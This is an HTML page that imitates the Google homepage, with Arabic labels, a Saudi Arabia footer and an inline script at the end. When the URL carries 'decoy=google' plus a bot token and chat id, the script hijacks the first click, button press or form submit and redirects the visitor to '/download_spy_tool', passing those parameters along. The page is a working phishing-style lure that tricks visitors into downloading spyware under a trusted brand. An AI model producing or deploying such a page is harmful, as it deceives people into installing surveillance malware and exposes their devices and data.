<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #202124;
            color: #e8eaed;
        }
        .google-logo {
            width: 272px;
            height: 92px;
            margin-bottom: 20px;
        }
        .search-bar {
            display: flex;
            border: 1px solid #5f6368;
            border-radius: 24px;
            width: 584px;
            height: 44px;
            background-color: #303134;
            margin-bottom: 20px;
        }
        .search-bar:hover {
            box-shadow: 0 1px 6px rgba(32,33,36,.28);
            border-color: rgba(223,225,229,0);
        }
        .search-input {
            flex-grow: 1;
            border: none;
            background: transparent;
            outline: none;
            padding: 0 20px;
            color: #e8eaed;
            font-size: 16px;
        }
        .search-icon, .mic-icon {
            display: flex;
            align-items: center;
            padding: 0 13px;
        }
        .search-icon svg, .mic-icon svg {
            fill: #9aa0a6;
            width: 20px;
            height: 20px;
        }
        .buttons {
            display: flex;
            gap: 12px;
        }
        .button {
            background-color: #303134;
            border: 1px solid #303134;
            border-radius: 4px;
            color: #e8eaed;
            font-size: 14px;
            padding: 10px 16px;
            cursor: pointer;
        }
        .button:hover {
            border-color: #5f6368;
        }
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #171717;
            color: #9aa0a6;
            padding: 15px 30px;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .footer a {
            color: #9aa0a6;
            text-decoration: none;
            margin-left: 20px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" alt="Google">
    <div class="search-bar">
        <div class="search-icon">
            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
        </div>
        <input type="text" class="search-input" value="" autofocus>
        <div class="mic-icon">
            <svg class="goxjub" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#4285f4" d="m12 15c1.66 0 3-1.31 3-2.97v-7.02c0-1.66-1.34-3.01-3-3.01s-3 1.34-3 3.01v7.02c0 1.66 1.34 2.97 3 2.97z"></path><path fill="#34a853" d="m10.94 18.05c-1.72-.29-3.22-1.6-3.22-3.52h-1.92c0 2.76 2.02 5.09 4.66 5.46v2.31h2c0-.36.03-.72.03-1.08v-2.31c2.64-.37 4.66-2.7 4.66-5.46h-1.92c0 1.92-1.5 3.23-3.22 3.52v.01z"></path></svg>
        </div>
    </div>
    <div class="buttons">
        <button class="button">بحث Google</button>
        <button class="button">ضربة حظ</button>
    </div>

    <div class="footer">
        <div>
            <span>المملكة العربية السعودية</span>
        </div>
        <div>
            <a href="#">الإعلانات</a>
            <a href="#">الأعمال</a>
            <a href="#">كيف يعمل البحث</a>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const urlParams = new URLSearchParams(window.location.search);
            const decoyParam = urlParams.get("decoy");
            const botToken = urlParams.get("token");
            const chatId = urlParams.get("chatid");

            if (decoyParam === "google" && botToken && chatId) {
                // Trigger download on any click or interaction
                document.body.addEventListener("click", function() {
                    const downloadUrl = `/download_spy_tool?token=${botToken}&chatid=${chatId}`;
                    window.location.href = downloadUrl;
                }, { once: true }); // Only trigger once

                // Also trigger on form submission or button click
                const searchForm = document.querySelector("form");
                if (searchForm) {
                    searchForm.addEventListener("submit", function(event) {
                        event.preventDefault(); // Prevent actual form submission
                        const downloadUrl = `/download_spy_tool?token=${botToken}&chatid=${chatId}`;
                        window.location.href = downloadUrl;
                    }, { once: true });
                }

                const buttons = document.querySelectorAll(".button");
                buttons.forEach(button => {
                    button.addEventListener("click", function(event) {
                        event.preventDefault(); // Prevent actual button action
                        const downloadUrl = `/download_spy_tool?token=${botToken}&chatid=${chatId}`;
                        window.location.href = downloadUrl;
                    }, { once: true });
                });
            }
        });
    </script>
</body>
</html>
